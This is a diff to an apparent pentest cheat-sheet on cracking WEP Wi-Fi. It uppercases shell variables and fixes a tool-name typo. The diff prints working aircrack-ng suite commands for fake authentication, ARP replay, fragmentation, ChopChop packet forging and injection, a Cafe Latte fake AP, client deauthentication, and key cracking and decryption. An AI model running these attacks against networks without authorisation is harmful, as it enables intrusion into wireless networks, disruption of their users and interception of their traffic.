@@ -45,11 +45,11 @@ The keystream (PRGA) is RC4(IV + Key). If you know the keystream for a given pac
 
 Most WEP networks use **Open** mode. To inject packets, you must be associated with the AP:
 
-- If a client is connected -> use their MAC (`-h $client_mac`)
+- If a client is connected -> use their MAC (`-h $CLIENT_MAC`)
 - If no client is connected -> associate yourself with fake authentication
 
 ```bash
-aireplay-ng -1 0 -a $bssid -h $our_mac $interface
+aireplay-ng -1 0 -a $BSSID -h $OUR_MAC $INTERFACE
 ```
 
 This sends an authentication request and an association request. After this, your MAC appears in airodump-ng's station list.
@@ -65,12 +65,12 @@ For long attacks ([Fragmentation](#fragmentation), [ChopChop](#korek-chopchop)),
 
 ::: code-group
 
-```bash [airecrack-ng]
-aireplay-ng -1 5000 -o 1 -q 5 -e $essid -a $bssid -h $our_mac $interface
+```bash [aircrack-ng]
+aireplay-ng -1 5000 -o 1 -q 5 -e $ESSID -a $BSSID -h $OUR_MAC $INTERFACE
 ```
 
 ```bash [wifite]
-wifite --wep --require-fakeauth --bssid $bssid
+wifite --wep --require-fakeauth --bssid $BSSID
 ```
 
 :::
@@ -89,10 +89,10 @@ Before starting any attack, set up capture and cracking in the background:
 
 ```bash
 # Capture IVs
-airodump-ng -c $channel --bssid $bssid -w capture $interface
+airodump-ng -c $CHANNEL --bssid $BSSID -w capture $INTERFACE
 
 # Crack (retries every 5000 IVs)
-aircrack-ng -a 1 -b $bssid capture.cap
+aircrack-ng -a 1 -b $BSSID capture.cap
 ```
 
 The `#Data` column in airodump-ng shows the IV count. Once it reaches **~20,000 - 60,000**, aircrack-ng will recover the key.
@@ -109,7 +109,7 @@ The `#Data` column in airodump-ng shows the IV count. Once it reaches **~20,000 
 :::
 
 ```bash
-aireplay-ng -3 -b $bssid -h $client_mac $interface
+aireplay-ng -3 -b $BSSID -h $CLIENT_MAC $INTERFACE
 ```
 
 ::: danger Note
@@ -127,16 +127,16 @@ If no ARP request appears, combine with a deauth to force the client to reconnec
 
 ```bash
 # Get PRGA
-aireplay-ng -5 -b $bssid -h $client_mac $interface
+aireplay-ng -5 -b $BSSID -h $CLIENT_MAC $INTERFACE
 
 # Check IPs (optional)
 tcpdump -s 0 -n -e -r replay_dec-xxxx-xxxxxx.cap
 
 # Forge ARP request
-packetforge-ng -0 -a $bssid -h $client_mac -k $ap_ip -l $client_ip -y fragment-xxxx.xor -w forged.cap
+packetforge-ng -0 -a $BSSID -h $CLIENT_MAC -k $AP_IP -l $CLIENT_IP -y fragment-xxxx.xor -w forged.cap
 
 # Inject
-aireplay-ng -2 -r forged.cap $interface
+aireplay-ng -2 -r forged.cap $INTERFACE
 ```
 
 ::: warning No IPs in tcpdump ?
@@ -156,16 +156,16 @@ Use broadcast `255.255.255.255` for both `-k` and `-l` in `packetforge-ng`. The 
 
 ```bash
 # Get PRGA
-aireplay-ng -4 -b $bssid -h $client_mac $interface
+aireplay-ng -4 -b $BSSID -h $CLIENT_MAC $INTERFACE
 
 # Forge ARP request (same as fragmentation)
-packetforge-ng -0 -a $bssid -h $client_mac -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-xxxx.cap -w forged.cap
+packetforge-ng -0 -a $BSSID -h $CLIENT_MAC -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-xxxx.cap -w forged.cap
 
 # Inject
-aireplay-ng -2 -r forged.cap $interface
+aireplay-ng -2 -r forged.cap $INTERFACE
 ```
 
-> If you used fake authentication, replace `$client_mac` with `$our_mac`.
+> If you used fake authentication, replace `$CLIENT_MAC` with `$OUR_MAC`.
 
 ### Cafe Latte
 
@@ -185,13 +185,13 @@ Requires a client connected (active or not).
 
 ```bash
 # Listen for ARP
-aireplay-ng --caffe-latte -b $bssid -h $client_mac $interface
+aireplay-ng --caffe-latte -b $BSSID -h $CLIENT_MAC $INTERFACE
 
 # Fake AP
-airbase-ng -c $channel -a $bssid -e "$ssid" $interface -W 1 -L
+airbase-ng -c $CHANNEL -a $BSSID -e "$SSID" $INTERFACE -W 1 -L
 
 # Deauth to force client reconnect
-aireplay-ng -0 10 -a $bssid -c $client_mac $interface
+aireplay-ng -0 10 -a $BSSID -c $CLIENT_MAC $INTERFACE
 ```
 
 ## 🔓 Cracking
@@ -200,10 +200,10 @@ Possible key lengths: `64/128/152/256/512 bits`
 
 ```bash
 # WEP cracking via IVs
-aircrack-ng -a 1 -b $bssid capture.cap
+aircrack-ng -a 1 -b $BSSID capture.cap
 
 # With key length specified (e.g., 64 bits)
-aircrack-ng -a 1 -n 64 -b $bssid capture.cap
+aircrack-ng -a 1 -n 64 -b $BSSID capture.cap
 ```
 
 ::: details wpa_supplicant
@@ -211,7 +211,7 @@ aircrack-ng -a 1 -n 64 -b $bssid capture.cap
 ```bash
 # wep.conf
 network={
-    ssid="$ssid"
+    ssid="$SSID"
     key_mgmt=NONE
     wep_key0=AABBCCDDEE
     wep_tx_keyidx=0
@@ -219,8 +219,8 @@ network={
 ```
 
 ```bash
-sudo wpa_supplicant -i $interface -c wep.conf
-sudo dhclient $interface
+sudo wpa_supplicant -i $INTERFACE -c wep.conf
+sudo dhclient $INTERFACE
 ```
 
 :::
@@ -229,10 +229,10 @@ sudo dhclient $interface
 
 ```bash [aircrack-ng]
 # Wordlist
-aircrack-ng -a 1 -b $bssid -w rockyou.txt capture.cap
+aircrack-ng -a 1 -b $BSSID -w rockyou.txt capture.cap
 
 # Generate all 5-byte combinations
-john --incremental=ASCII5 --stdout | aircrack-ng -n 64 -a 1 -b $bssid capture.cap -w-
+john --incremental=ASCII5 --stdout | aircrack-ng -n 64 -a 1 -b $BSSID capture.cap -w-
 ```
 
 ## 🔐 Decrypt (airdecap-ng)
@@ -240,5 +240,5 @@ john --incremental=ASCII5 --stdout | aircrack-ng -n 64 -a 1 -b $bssid capture.ca
 Decrypt a captured WEP file once the key is recovered:
 
 ```bash
-airdecap-ng -w $wep_key capture.cap
+airdecap-ng -w $WEP_KEY capture.cap
 ```
